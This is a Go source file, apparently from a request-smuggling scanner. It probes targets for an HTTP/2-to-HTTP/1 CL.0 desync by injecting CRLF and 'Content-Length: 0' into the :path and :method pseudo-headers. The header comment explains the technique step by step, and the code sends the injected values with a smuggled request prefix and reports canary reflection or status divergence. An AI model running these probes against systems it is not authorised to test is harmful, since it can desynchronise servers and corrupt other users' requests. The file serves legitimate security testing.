package scan

// h2clinject.go — CL.0 desync via H2 pseudo-header CRLF injection
//
// Technique: inject "Content-Length: 0" into the H1 request produced by H2→H1
// downgrade, via CRLF embedded in :path or :method pseudo-header values.
//
// Mechanism:
//   - H2 front-end uses DATA frames to delimit the body (ignores Content-Length).
//   - When downgrading to H1, if :path/:method is forwarded verbatim, the injected
//     "Content-Length: 0" header reaches the back-end.
//   - Back-end H1 reads CL=0, treats the request as body-less.
//   - The DATA frame body (smuggled prefix) remains in the TCP buffer and is
//     parsed as the beginning of the next request → CL.0 desync.
//
// :path injection:
//   :path  = / HTTP/1.1\r\nContent-Length: 0\r\nx: x
//   body   = GET /canary HTTP/1.1\r\nFoo: <absorbs next request's first line>
//   H1 result:
//     GET / HTTP/1.1
//     Content-Length: 0
//     x: x HTTP/1.1        ← "x: x" absorbs trailing " HTTP/1.1" from proxy
//     Host: target
//     ...
//                          ← back-end stops here (CL=0), body stays in buffer
//     GET /canary HTTP/1.1\r\nFoo: <next real request's line absorbed here>
//
// :method injection:
//   :method = POST / HTTP/1.1\r\nContent-Length: 0\r\nx: x
//   Same mechanism — proxy uses :method verbatim as start of request-line.
//
// Detection: same as H1 CL.0 — gadget bleed (probe response reflects smuggled path)
// or status divergence between baseline and probe.

import (
	"fmt"
	"net/url"

	"github.com/smuggled/smuggled/internal/config"
	"github.com/smuggled/smuggled/internal/report"
	"github.com/smuggled/smuggled/internal/request"
)

// ScanH2CLInject tests CL.0 desync via CRLF injection in H2 :path and :method.
func ScanH2CLInject(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("H2CLInject")
	if target.Scheme != "https" {
		return
	}
	if !request.ProbeH2(target, cfg) {
		rep.Log("H2CLInject: %s does not negotiate h2, skipping", target.Host)
		return
	}

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()

	// Baseline via H2
	baseline, err := h2RawRequest(target, "GET", path, host, "", nil, cfg)
	if err != nil || baseline.Status == 0 {
		dbg(cfg, "baseline failed: %v", err)
		return
	}
	baseStatus := baseline.Status
	dbg(cfg, "baseline status=%d", baseStatus)

	// Gadget: smuggled request whose response is distinctive
	canaryPath := config.EffectiveCanaryPath(cfg)
	// "Foo: " absorbs the first line of the next real request
	smuggledBody := fmt.Sprintf("GET %s HTTP/1.1\r\nFoo: ", canaryPath)

	probes := []struct {
		name      string
		headerKey string
		method    string
	}{
		{"path-inject", ":path", "GET"},
		{"method-inject", ":method", "POST"},
	}

	for _, p := range probes {
		if !techniqueEnabled("H2.CL/"+p.name, cfg) {
			continue
		}

		// Build injected value: "/ HTTP/1.1\r\nContent-Length: 0\r\nx: x"
		var injected string
		if p.headerKey == ":path" {
			injected = fmt.Sprintf("%s HTTP/1.1\r\nContent-Length: 0\r\nx: x", path)
		} else {
			injected = fmt.Sprintf("%s %s HTTP/1.1\r\nContent-Length: 0\r\nx: x", p.method, path)
		}

		extra := map[string]string{p.headerKey: injected}

		rep.Log("H2CLInject [%s]: probe target=%s canary=%s", p.name, host, canaryPath)
		dbg(cfg, "[%s]: %s=%q smuggled=%q", p.name, p.headerKey, injected, smuggledBody)

		for attempt := 0; attempt < cfg.Attempts; attempt++ {
			// Send H2 attack: CL=0 injected in header, smuggled prefix in DATA frame
			_, err := h2RawRequest(target, p.method, path, host, smuggledBody, extra, cfg)
			if err != nil {
				dbg(cfg, "[%s]: attempt %d attack error: %v", p.name, attempt, err)
				continue
			}

			// Probe: plain H2 GET — did it get the canary response?
			probe, err := h2RawRequest(target, "GET", path, host, "", nil, cfg)
			if err != nil || probe.Status == 0 {
				dbg(cfg, "[%s]: attempt %d probe error: %v", p.name, attempt, err)
				continue
			}

			probeStatus := probe.Status
			canaryReflected := request.ContainsStr(probe.Body, canaryPath)
			dbg(cfg, "[%s]: attempt %d probeStatus=%d baseline=%d canary=%v",
				p.name, attempt, probeStatus, baseStatus, canaryReflected)

			// ── Detection 1: canary path reflected in probe body ──────
			if canaryReflected {
				dbg(cfg, "[%s]: CONFIRMED canary bleed at attempt %d", p.name, attempt)
				rawProbe := fmt.Sprintf("%s %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: 0\r\n\r\n%s",
					p.method, path, host, p.headerKey, injected, smuggledBody)
				rep.Emit(report.Finding{
					Target:    target.String(),
					Method:    "HTTP/2",
					Severity:  report.SeverityConfirmed,
					Type:      "H2.CL",
					Technique: "H2.CL/" + p.name,
					Description: fmt.Sprintf(
						"H2.CL (CL.0) desync via %s CRLF injection: injected 'Content-Length: 0' "+
							"caused the back-end to treat the DATA frame body as a new request. "+
							"Probe reflected smuggled path '%s' (attempt %d).",
						p.headerKey, canaryPath, attempt),
					Evidence: fmt.Sprintf("attempt=%d canary=%s probe_status=%d baseline=%d",
						attempt, canaryPath, probeStatus, baseStatus),
					RawProbe: rawProbe,
				})
				rep.Log("H2CLInject [!] %s confirmed on %s", p.name, target.String())
				if cfg.ExitOnFind {
					return
				}
				break
			}

			// ── Detection 2: status divergence ───────────────────────
			if attempt > 0 && probeStatus != baseStatus && probeStatus != 429 {
				dbg(cfg, "[%s]: status divergence at attempt %d: base=%d probe=%d",
					p.name, attempt, baseStatus, probeStatus)
				rawProbe := fmt.Sprintf("%s %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: 0\r\n\r\n%s",
					p.method, path, host, p.headerKey, injected, smuggledBody)
				rep.Emit(report.Finding{
					Target:    target.String(),
					Method:    "HTTP/2",
					Severity:  report.SeverityProbable,
					Type:      "H2.CL",
					Technique: "H2.CL/" + p.name,
					Description: fmt.Sprintf(
						"H2.CL (CL.0) desync via %s CRLF injection: probe response status %d "+
							"diverged from baseline %d after %d attack attempts. "+
							"Injected 'Content-Length: 0' may have caused smuggling.",
						p.headerKey, probeStatus, baseStatus, attempt),
					Evidence: fmt.Sprintf("attempt=%d probe_status=%d baseline=%d",
						attempt, probeStatus, baseStatus),
					RawProbe: rawProbe,
				})
				rep.Log("H2CLInject [!] %s status divergence on %s", p.name, target.String())
				if cfg.ExitOnFind {
					return
				}
				break
			}
		}
	}
}
